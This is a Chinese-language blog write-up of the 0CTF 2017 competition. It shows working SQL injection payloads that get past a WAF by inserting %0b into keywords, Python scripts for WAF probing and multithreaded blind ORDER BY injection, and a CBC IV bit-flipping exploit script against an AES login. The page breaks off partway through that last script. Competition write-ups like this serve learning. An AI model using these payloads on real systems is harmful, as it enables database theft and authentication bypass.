@@ -1,0 +1,303 @@
+<!DOCTYPE html><html lang="en"><head><style>:where(img){height:auto;width:auto}</style>
+    <meta charset="UTF-8">
+    <meta content="width=device-width" name="viewport">
+    <link href="/favicon.svg" rel="icon" type="image/svg+xml">
+    <link href="https://blog.sakanano.moe/posts/archive_0ctf2017_writeup/" rel="canonical">
+    <meta content="Astro v2.4.5" name="generator">
+
+    <!-- General Meta Tags -->
+    <title>0ctf2017 writeup from cnss</title>
+    <meta content="0ctf2017 writeup from cnss" name="title">
+    <meta content="Already Archive Before 20230604" name="description">
+    <meta content="lc4t" name="author">
+    <link href="/sitemap-index.xml" rel="sitemap">
+
+    <!-- Open Graph / Facebook -->
+    <meta content="0ctf2017 writeup from cnss" property="og:title">
+    <meta content="Already Archive Before 20230604" property="og:description">
+    <meta content="https://blog.sakanano.moe/posts/archive_0ctf2017_writeup/" property="og:url">
+    <meta content="https://blog.sakanano.moe/0ctf2017%20writeup%20from%20cnss.png" property="og:image">
+
+    <!-- Twitter -->
+    <meta content="summary_large_image" property="twitter:card">
+    <meta content="https://blog.sakanano.moe/posts/archive_0ctf2017_writeup/" property="twitter:url">
+    <meta content="0ctf2017 writeup from cnss" property="twitter:title">
+    <meta content="Already Archive Before 20230604" property="twitter:description">
+    <meta content="https://blog.sakanano.moe/0ctf2017%20writeup%20from%20cnss.png" property="twitter:image">
+
+    <!-- Google Font -->
+    <link href="https://fonts.googleapis.com" rel="preconnect">
+    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400;1,600&amp;display=swap" rel="stylesheet">
+
+    
+
+    <script src="/toggle-theme.js"></script>
+  <link href="/_astro/404.03f57927.css" rel="stylesheet">
+<link href="/_astro/about.ace74c2a.css" rel="stylesheet">
+<link href="/_astro/about.6e6daff0.css" rel="stylesheet">
+<link href="/_astro/_slug_.40cf44c5.css" rel="stylesheet">
+<link href="/_astro/_slug_.41a32359.css" rel="stylesheet">
+<link href="/_astro/about.18333935.css" rel="stylesheet">
+<link href="/_astro/about.34388b73.css" rel="stylesheet">
+<link href="/_astro/_slug_.3b14054e.css" rel="stylesheet">
+<link href="/_astro/_slug_.906d67ca.css" rel="stylesheet"><script type="module">const e=document.querySelector(".hamburger-menu"),n=document.querySelector(".menu-icon"),u=document.querySelector("#menu-items");e?.addEventListener("click",()=>{let t="true"===e.getAttribute("aria-expanded");n?.classList.toggle("is-active"),e.setAttribute("aria-expanded",t?"false":"true"),e.setAttribute("aria-label",t?"Open Menu":"Close Menu"),u?.classList.toggle("display-none")});</script></head>
+  <body>
+    
+  <header class="astro-3EF6KSR2">
+  <a href="#main-content" class="astro-3EF6KSR2" id="skip-to-content">Skip to content</a>
+  <div class="astro-3EF6KSR2 nav-container">
+    <div class="astro-3EF6KSR2 top-nav-wrap">
+      <a href="/" class="astro-3EF6KSR2 logo">
+        鱼の
+      </a>
+      <nav class="astro-3EF6KSR2" id="nav-menu">
+        <button class="astro-3EF6KSR2 focus-outline hamburger-menu" aria-label="Open Menu" aria-controls="menu-items" aria-expanded="false">
+          <svg class="astro-3EF6KSR2 menu-icon" xmlns="http://www.w3.org/2000/svg" stroke-linecap="round" stroke-linejoin="round" fill="none" height="24" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24" width="24">
+            <line class="line astro-3EF6KSR2" x1="7" x2="21" y1="12" y2="12"></line>
+            <line class="line astro-3EF6KSR2" x1="3" x2="21" y1="6" y2="6"></line>
+            <line class="line astro-3EF6KSR2" x1="12" x2="21" y1="18" y2="18"></line>
+            <line class="astro-3EF6KSR2 close" x1="18" x2="6" y1="6" y2="18"></line>
+            <line class="astro-3EF6KSR2 close" x1="6" x2="18" y1="6" y2="18"></line>
+          </svg>
+        </button>
+        <ul class="astro-3EF6KSR2 display-none sm:flex" id="menu-items">
+          <li class="astro-3EF6KSR2">
+            <a href="/posts" class="astro-3EF6KSR2">
+              Posts
+            </a>
+          </li>
+          <li class="astro-3EF6KSR2">
+            <a href="/tags" class="astro-3EF6KSR2">
+              Tags
+            </a>
+          </li>
+          <li class="astro-3EF6KSR2">
+            <a href="/about" class="astro-3EF6KSR2">
+              About
+            </a>
+          </li>
+          <li class="astro-3EF6KSR2">
+            <a href="/search" class="astro-3EF6KSR2 focus-outline astro-5EUNQZKT group inline-block p-3 sm:p-1" tabindex="0" title="Search" aria-label="search">
+  
+              <svg class="astro-3EF6KSR2 scale-125 sm:scale-100" xmlns="http://www.w3.org/2000/svg"><path d="M19.023 16.977a35.13 35.13 0 0 1-1.367-1.384c-.372-.378-.596-.653-.596-.653l-2.8-1.337A6.962 6.962 0 0 0 16 9c0-3.859-3.14-7-7-7S2 5.141 2 9s3.14 7 7 7c1.763 0 3.37-.66 4.603-1.739l1.337 2.8s.275.224.653.596c.387.363.896.854 1.384 1.367l1.358 1.392.604.646 2.121-2.121-.646-.604c-.379-.372-.885-.866-1.391-1.36zM9 14c-2.757 0-5-2.243-5-5s2.243-5 5-5 5 2.243 5 5-2.243 5-5 5z" class="astro-3EF6KSR2"></path>
+              </svg>
+            
+</a>
+          </li>
+          <li class="astro-3EF6KSR2">
+            <button class="astro-3EF6KSR2 focus-outline" aria-label="auto" aria-live="polite" id="theme-btn" title="Toggles light &amp; dark">
+                  <svg class="astro-3EF6KSR2" xmlns="http://www.w3.org/2000/svg" id="moon-svg">
+                    <path d="M20.742 13.045a8.088 8.088 0 0 1-2.077.271c-2.135 0-4.14-.83-5.646-2.336a8.025 8.025 0 0 1-2.064-7.723A1 1 0 0 0 9.73 2.034a10.014 10.014 0 0 0-4.489 2.582c-3.898 3.898-3.898 10.243 0 14.143a9.937 9.937 0 0 0 7.072 2.93 9.93 9.93 0 0 0 7.07-2.929 10.007 10.007 0 0 0 2.583-4.491 1.001 1.001 0 0 0-1.224-1.224zm-2.772 4.301a7.947 7.947 0 0 1-5.656 2.343 7.953 7.953 0 0 1-5.658-2.344c-3.118-3.119-3.118-8.195 0-11.314a7.923 7.923 0 0 1 2.06-1.483 10.027 10.027 0 0 0 2.89 7.848 9.972 9.972 0 0 0 7.848 2.891 8.036 8.036 0 0 1-1.484 2.059z" class="astro-3EF6KSR2"></path>
+                  </svg>
+                  <svg class="astro-3EF6KSR2" xmlns="http://www.w3.org/2000/svg" id="sun-svg">
+                    <path d="M6.993 12c0 2.761 2.246 5.007 5.007 5.007s5.007-2.246 5.007-5.007S14.761 6.993 12 6.993 6.993 9.239 6.993 12zM12 8.993c1.658 0 3.007 1.349 3.007 3.007S13.658 15.007 12 15.007 8.993 13.658 8.993 12 10.342 8.993 12 8.993zM10.998 19h2v3h-2zm0-17h2v3h-2zm-9 9h3v2h-3zm17 0h3v2h-3zM4.219 18.363l2.12-2.122 1.415 1.414-2.12 2.122zM16.24 6.344l2.122-2.122 1.414 1.414-2.122 2.122zM6.342 7.759 4.22 5.637l1.415-1.414 2.12 2.122zm13.434 10.605-1.414 1.414-2.122-2.122 1.414-1.414z" class="astro-3EF6KSR2"></path>
+                  </svg>
+                </button>
+          </li>
+        </ul>
+      </nav>
+    </div>
+  </div>
+  <div class="max-w-3xl mx-auto px-4">
+  <hr aria-hidden="true" class="border-skin-line">
+</div>
+</header>
+  <div class="astro-VJ4TPSPI flex justify-start max-w-3xl mx-auto px-2 w-full">
+    <button class="astro-VJ4TPSPI flex focus-outline hover:opacity-75 mb-2 mt-8" onclick="history.back()">
+      <svg class="astro-VJ4TPSPI" xmlns="http://www.w3.org/2000/svg"><path d="M13.293 6.293 7.586 12l5.707 5.707 1.414-1.414L10.414 12l4.293-4.293z" class="astro-VJ4TPSPI"></path>
+      </svg><span class="astro-VJ4TPSPI">Go back</span>
+    </button>
+  </div>
+  <main class="astro-VJ4TPSPI" id="main-content">
+    <h1 class="astro-VJ4TPSPI post-title">0ctf2017 writeup from cnss</h1>
+    <div class="astro-VJ4TPSPI flex items-center my-2 opacity-80 space-x-2" data-hk="0-0"><svg class="inline-block fill-skin-base h-6 scale-100 w-6" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M7 11h2v2H7zm0 4h2v2H7zm4-4h2v2h-2zm0 4h2v2h-2zm4-4h2v2h-2zm0 4h2v2h-2z"></path><path d="M5 22h14c1.103 0 2-.897 2-2V6c0-1.103-.897-2-2-2h-2V2h-2v2H9V2H7v2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2zM19 8l.001 12H5V8h14z"></path></svg><span class="sr-only">Posted on:</span><span class="italic text-base">2017年3月20日<span data-hk="0-1-0" aria-hidden="true"> | </span><span class="sr-only" data-hk="0-1-1">&nbsp;at&nbsp;</span>04:00</span></div>
+    <article class="astro-VJ4TPSPI max-w-3xl mx-auto mt-8 prose" id="article" role="article">
+      <p>结果高校第 9, 水啊</p>
+<!--more-->
+<h3 id="web">Web</h3>
+<h4 id="simplesqlin">simplesqlin</h4>
+<p><code>id</code>先丢 sqlmap,发现能跑出来数据库名<code>news</code></p>
+<p><code>order by 4</code> 500, <code>order by 3</code>正常</p>
+<p>绕 waf 试试看, 发现简单的 select,from 通过%0b 即可绕过</p>
+<p><code>select</code> -&gt; <code>sele%0bct</code></p>
+<p>直接 <code>id=-1 union sel%0bect 1,flag,3 fro%0bm news.flag</code>猜测表名和字段为 flag</p>
+<p><code>flag{W4f_bY_paSS_f0R_CI}</code></p>
+<h4 id="temmos-tiny-shop">Temmo’s Tiny Shop</h4>
+<p>中午起床解这个题, login 那里上午有 bug,直接 admin 密码空可以进(其实这里面有竞争条件去买 8000 的 hint),看到 info 提示的内容(中间还换过一个表名)</p>
+<p><code>OK! Now I will give some hint: you can get flag by use \</code>select flag from ce63e444b0d049e9c899c9a0336b3c59“</p>
+<p>然后写个脚本测试一下 waf 的字符</p>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#7f848e;font-style:italic">#!/usr/bin/python3</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> re</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> string</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> requests </span><span style="color:#c678dd;font-style:italic">as</span><span style="color:#abb2bf"> r</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">url </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#98c379">'http://202.120.7.197/app.php?action=search&amp;keyword=INT&amp;order='</span></span>
+<span class="line"><span style="color:#abb2bf">headers </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> {</span></span>
+<span class="line"><span style="color:#abb2bf">	</span><span style="color:#98c379">'Cookie'</span><span style="color:#abb2bf">: </span><span style="color:#98c379">"PHPSESSID=tbuidum4os7k89q7dun6oms200"</span><span style="color:#abb2bf">,</span></span>
+<span class="line"><span style="color:#abb2bf">}</span></span>
+<span class="line"><span style="color:#d19a66">NOWAF</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> []</span></span>
+<span class="line"><span style="color:#d19a66">WAF</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> []</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">for</span><span style="color:#abb2bf"> i </span><span style="color:#c678dd;font-style:italic">in</span><span style="color:#abb2bf"> string.punctuation </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> string.ascii_letters:</span></span>
+<span class="line"><span style="color:#abb2bf">	getter </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> r.</span><span style="color:#61afef">get</span><span style="color:#abb2bf">(url </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> i, </span><span style="color:#e06c75;font-style:italic">headers</span><span style="color:#56b6c2">=</span><span style="color:#abb2bf">headers).text</span></span>
+<span class="line"><span style="color:#abb2bf">	</span><span style="color:#c678dd;font-style:italic">if</span><span style="color:#abb2bf"> </span><span style="color:#98c379">'error occurs or no result here'</span><span style="color:#abb2bf"> </span><span style="color:#c678dd;font-style:italic">in</span><span style="color:#abb2bf"> getter:</span></span>
+<span class="line"><span style="color:#abb2bf">		</span><span style="color:#d19a66">NOWAF</span><span style="color:#abb2bf">.</span><span style="color:#61afef">append</span><span style="color:#abb2bf">(i)</span></span>
+<span class="line"><span style="color:#abb2bf">		</span><span style="color:#56b6c2">print</span><span style="color:#abb2bf">(</span><span style="color:#98c379">'NoWAF: '</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> i)</span></span>
+<span class="line"><span style="color:#abb2bf">	</span><span style="color:#c678dd;font-style:italic">elif</span><span style="color:#abb2bf"> </span><span style="color:#98c379">'WAF'</span><span style="color:#abb2bf"> </span><span style="color:#c678dd;font-style:italic">in</span><span style="color:#abb2bf"> getter:</span></span>
+<span class="line"><span style="color:#abb2bf">		</span><span style="color:#d19a66">WAF</span><span style="color:#abb2bf">.</span><span style="color:#61afef">append</span><span style="color:#abb2bf">(i)</span></span>
+<span class="line"><span style="color:#abb2bf">		</span><span style="color:#56b6c2">print</span><span style="color:#abb2bf">(</span><span style="color:#98c379">'WAF: '</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> i)</span></span>
+<span class="line"><span style="color:#abb2bf">	</span><span style="color:#c678dd;font-style:italic">else</span><span style="color:#abb2bf">:</span></span>
+<span class="line"><span style="color:#abb2bf">		</span><span style="color:#56b6c2">print</span><span style="color:#abb2bf">(getter)</span></span>
+<span class="line"><span style="color:#abb2bf">		</span><span style="color:#56b6c2">exit</span><span style="color:#abb2bf">()</span></span>
+<span class="line"><span style="color:#56b6c2">print</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">WAF</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#56b6c2">print</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">NOWAF</span><span style="color:#abb2bf">)</span></span></code></pre>
+<p>发现只有<code>#,()</code>和字母可以用,关键词没测,用的时候再说</p>
+<p>尝试了一些传参数的位置, 因为不能单引号, 也绕不过这个 waf, 下手只能在搜索的<code>order</code>位置上,先通过<code>=1</code>和<code>=id</code>确认是<code>order by</code>注入,通过顺序不同考虑 bool 注入</p>
+<p>注册一个新号防干扰, 买 1600 和 300 的, 通过利用<code>field(price, 1600, 300)</code>和<code>field(price, 1600, 1)</code>返回的 goods 顺序不同,构造 payload</p>
+<p><code>order=field(price,1600,if(mid((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),%d,1)like(%s),300,1))</code></p>
+<p>因为是 like, 不跑 2 分, 上多线程</p>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> requests </span><span style="color:#c678dd;font-style:italic">as</span><span style="color:#abb2bf"> r</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> gevent</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">from</span><span style="color:#abb2bf"> gevent.monkey </span><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">*</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">url </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#98c379">'http://202.120.7.197/app.php?action=search&amp;keyword=&amp;order=field(price,1600,if(mid((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),</span><span style="color:#d19a66">%d</span><span style="color:#98c379">,1)like(</span><span style="color:#d19a66">%s</span><span style="color:#98c379">),300,1))'</span></span>
+<span class="line"><span style="color:#c678dd">def</span><span style="color:#abb2bf"> </span><span style="color:#61afef">run</span><span style="color:#abb2bf">(</span><span style="color:#d19a66;font-style:italic">k</span><span style="color:#abb2bf">):</span></span>
+<span class="line"><span style="color:#7f848e;font-style:italic">#	print('----%d----' % k)</span></span>
+<span class="line"><span style="color:#abb2bf">	a </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">0</span></span>
+<span class="line"><span style="color:#abb2bf">	</span><span style="color:#c678dd;font-style:italic">for</span><span style="color:#abb2bf"> i </span><span style="color:#c678dd;font-style:italic">in</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">range</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">0</span><span style="color:#abb2bf">, </span><span style="color:#d19a66">255</span><span style="color:#abb2bf">):</span></span>
+<span class="line"><span style="color:#abb2bf">		</span><span style="color:#c678dd;font-style:italic">if</span><span style="color:#abb2bf"> a </span><span style="color:#56b6c2">==</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">4</span><span style="color:#abb2bf">:</span></span>
+<span class="line"><span style="color:#abb2bf">			</span><span style="color:#c678dd;font-style:italic">break</span></span>
+<span class="line"><span style="color:#abb2bf">		s </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> r.</span><span style="color:#61afef">get</span><span style="color:#abb2bf">(url </span><span style="color:#56b6c2">%</span><span style="color:#abb2bf"> (k,</span><span style="color:#56b6c2">hex</span><span style="color:#abb2bf">(i)), </span><span style="color:#e06c75;font-style:italic">headers</span><span style="color:#56b6c2">=</span><span style="color:#abb2bf">headers).text</span></span>
+<span class="line"><span style="color:#abb2bf">	</span><span style="color:#7f848e;font-style:italic">#	print(s)</span></span>
+<span class="line"><span style="color:#abb2bf">		</span><span style="color:#c678dd;font-style:italic">if</span><span style="color:#abb2bf"> </span><span style="color:#98c379">'"goods":[{"id":"6","'</span><span style="color:#abb2bf"> </span><span style="color:#c678dd;font-style:italic">not</span><span style="color:#abb2bf"> </span><span style="color:#c678dd;font-style:italic">in</span><span style="color:#abb2bf"> s:</span></span>
+<span class="line"><span style="color:#abb2bf">			</span><span style="color:#56b6c2">print</span><span style="color:#abb2bf">(</span><span style="color:#98c379">'</span><span style="color:#d19a66">%d</span><span style="color:#98c379">: </span><span style="color:#d19a66">%s</span><span style="color:#98c379">'</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">%</span><span style="color:#abb2bf"> (k, </span><span style="color:#56b6c2">chr</span><span style="color:#abb2bf">(i)))</span></span>
+<span class="line"><span style="color:#abb2bf">			a </span><span style="color:#56b6c2">+=</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">1</span></span>
+<span class="line"><span style="color:#abb2bf">		</span><span style="color:#c678dd;font-style:italic">else</span><span style="color:#abb2bf">:</span></span>
+<span class="line"><span style="color:#abb2bf">			</span><span style="color:#c678dd;font-style:italic">continue</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">gevent.monkey.</span><span style="color:#61afef">patch_socket</span><span style="color:#abb2bf">()</span></span>
+<span class="line"><span style="color:#abb2bf">gevent.monkey.</span><span style="color:#61afef">patch_ssl</span><span style="color:#abb2bf">()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">threads </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> [gevent.</span><span style="color:#61afef">spawn</span><span style="color:#abb2bf">(run, i) </span><span style="color:#c678dd;font-style:italic">for</span><span style="color:#abb2bf"> i </span><span style="color:#c678dd;font-style:italic">in</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">range</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">6</span><span style="color:#abb2bf">,</span><span style="color:#d19a66">31</span><span style="color:#abb2bf">)]</span></span>
+<span class="line"><span style="color:#abb2bf">gevent.</span><span style="color:#61afef">joinall</span><span style="color:#abb2bf">(threads)</span></span></code></pre>
+<p>拿到每一位去掉<code>%_</code>,得到大小写不明的<code>flag{r4ce c0nditi0n i5 excited}</code></p>
+<p>尝试用 ascii 判断 ascii 码, 发现(长度)被 WAF, 先试一下 flag 对不对再说</p>
+<p>中间补上<code>_</code>, 小写尝试一下, flag 正确</p>
+<h3 id="misc">Misc</h3>
+<h4 id="welcome">Welcome</h4>
+<p>IRC 即时聊天，访问 freenode 网站进入聊天室，获得 flag
+<a href="http://webchat.freenode.net/?randomnick=0&amp;channels=#0ctf2017">http://webchat.freenode.net/?randomnick=0&amp;channels=#0ctf2017</a></p>
+<h3 id="crypto">Crypto</h3>
+<h4 id="integrity">integrity</h4>
+<p>题目流程：</p>
+<ol>
+<li>首先随机 key</li>
+<li>register： 输入 name，首先对 name 补足后缀，随机 iv，返回 AES_CBC( md5(name) || name ) 作为 secret</li>
+<li>login： 用户输入 secret，按 register 逆着解码得到 name，若为 admin，则给出 flag</li>
+</ol>
+<p>其中限制：输入的 name 长度不大于 32，且对 name 有 strip() 操作。</p>
+<p>我们的目标为 admin，对此构造 name，并预先计算补全与 md5 值。</p>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">name </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"admin"</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"</span><span style="color:#56b6c2">\x0b</span><span style="color:#98c379">"</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">*</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">11</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> suffix  </span><span style="color:#7f848e;font-style:italic"># suffix 为任意长度小于 16 的字符串，我取的是 suffix = "admin"）</span></span>
+<span class="line"><span style="color:#abb2bf">goal </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"admin"</span><span style="color:#abb2bf">  </span><span style="color:#7f848e;font-style:italic"># 目标为 admin</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">pad_name </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#61afef">pad</span><span style="color:#abb2bf">(name)  </span><span style="color:#7f848e;font-style:italic"># "admin" + "\x0b" * 11 + "admin" + "\x0b" * 11</span></span>
+<span class="line"><span style="color:#abb2bf">pad_goal </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#61afef">pad</span><span style="color:#abb2bf">(goal)  </span><span style="color:#7f848e;font-style:italic"># "admin" + "\x0b" * 11</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">md5_name </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#61afef">md5</span><span style="color:#abb2bf">(name).</span><span style="color:#61afef">digest</span><span style="color:#abb2bf">()</span></span>
+<span class="line"><span style="color:#abb2bf">md5_goal </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#61afef">md5</span><span style="color:#abb2bf">(goal).</span><span style="color:#61afef">digest</span><span style="color:#abb2bf">()</span></span></code></pre>
+<p>提交 name 后获得一个代表了 64 字节的 secret，取出 iv 和 前两组密文，即前 48 字节，有一组 iv，一组 md5 值，一组一半的 name（即 pad_goal）。
+其中第三组已符合要求，对于第二组，修改第一组的 iv 进行比特翻转攻击：iv = iv ⊕ md5_name ⊕ md5_goal
+三组重新组合后 login 即可获取 flag</p>
+<p>完整脚本：</p>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> hashlib</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> socket</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> time</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> binascii</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#d19a66">BS</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">16</span></span>
+<span class="line"><span style="color:#abb2bf">pad </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">lambda</span><span style="color:#abb2bf"> </span><span style="color:#d19a66;font-style:italic">s</span><span style="color:#abb2bf">: s </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> (</span><span style="color:#d19a66">BS</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">-</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">len</span><span style="color:#abb2bf">(s) </span><span style="color:#56b6c2">%</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">BS</span><span style="color:#abb2bf">) </span><span style="color:#56b6c2">*</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">chr</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">BS</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">-</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">len</span><span style="color:#abb2bf">(s) </span><span style="color:#56b6c2">%</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">BS</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#c678dd">def</span><span style="color:#abb2bf"> </span><span style="color:#61afef">md5</span><span style="color:#abb2bf">(</span><span style="color:#d19a66;font-style:italic">s</span><span style="color:#abb2bf">):</span></span>
+<span class="line"><span style="color:#abb2bf">    </span><span style="color:#c678dd;font-style:italic">return</span><span style="color:#abb2bf"> hashlib.</span><span style="color:#61afef">md5</span><span style="color:#abb2bf">(s.</span><span style="color:#61afef">encode</span><span style="color:#abb2bf">()).</span><span style="color:#61afef">digest</span><span style="color:#abb2bf">()</span></span>
+<span class="line"><span style="color:#c678dd">def</span><span style="color:#abb2bf"> </span><span style="color:#61afef">send</span><span style="color:#abb2bf">(</span><span style="color:#d19a66;font-style:italic">m</span><span style="color:#abb2bf">):</span></span>
+<span class="line"><span style="color:#abb2bf">    </span><span style="color:#c678dd;font-style:italic">if</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">isinstance</span><span style="color:#abb2bf">(m, </span><span style="color:#56b6c2">str</span><span style="color:#abb2bf">):</span></span>
+<span class="line"><span style="color:#abb2bf">        m </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> m.</span><span style="color:#61afef">encode</span><span style="color:#abb2bf">()</span></span>
+<span class="line"><span style="color:#abb2bf">    </span><span style="color:#56b6c2">print</span><span style="color:#abb2bf">(</span><span style="color:#98c379">"send:"</span><span style="color:#abb2bf">, m)</span></span>
+<span class="line"><span style="color:#abb2bf">    s.</span><span style="color:#61afef">send</span><span style="color:#abb2bf">(m)</span></span>
+<span class="line"><span style="color:#c678dd">def</span><span style="color:#abb2bf"> </span><span style="color:#61afef">rec</span><span style="color:#abb2bf">():</span></span>
+<span class="line"><span style="color:#abb2bf">    m </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> s.</span><span style="color:#61afef">recv</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">1024</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#abb2bf">    </span><span style="color:#56b6c2">print</span><span style="color:#abb2bf">(</span><span style="color:#98c379">"recv:"</span><span style="color:#abb2bf">, m)</span></span>
+<span class="line"><span style="color:#abb2bf">    </span><span style="color:#c678dd;font-style:italic">return</span><span style="color:#abb2bf"> m</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">s </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> socket.</span><span style="color:#61afef">socket</span><span style="color:#abb2bf">()</span></span>
+<span class="line"><span style="color:#abb2bf">s.</span><span style="color:#61afef">connect</span><span style="color:#abb2bf">((</span><span style="color:#98c379">'202.120.7.217'</span><span style="color:#abb2bf">, </span><span style="color:#d19a66">8221</span><span style="color:#abb2bf">))</span></span>
+<span class="line"><span style="color:#abb2bf">time.</span><span style="color:#61afef">sleep</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">0.5</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#abb2bf">md5_goal </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> [</span><span style="color:#56b6c2">int</span><span style="color:#abb2bf">(x) </span><span style="color:#c678dd;font-style:italic">for</span><span style="color:#abb2bf"> x </span><span style="color:#c678dd;font-style:italic">in</span><span style="color:#abb2bf"> </span><span style="color:#61afef">md5</span><span style="color:#abb2bf">(</span><span style="color:#98c379">"admin"</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"</span><span style="color:#56b6c2">\x0b</span><span style="color:#98c379">"</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">*</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">11</span><span style="color:#abb2bf">)]</span></span>
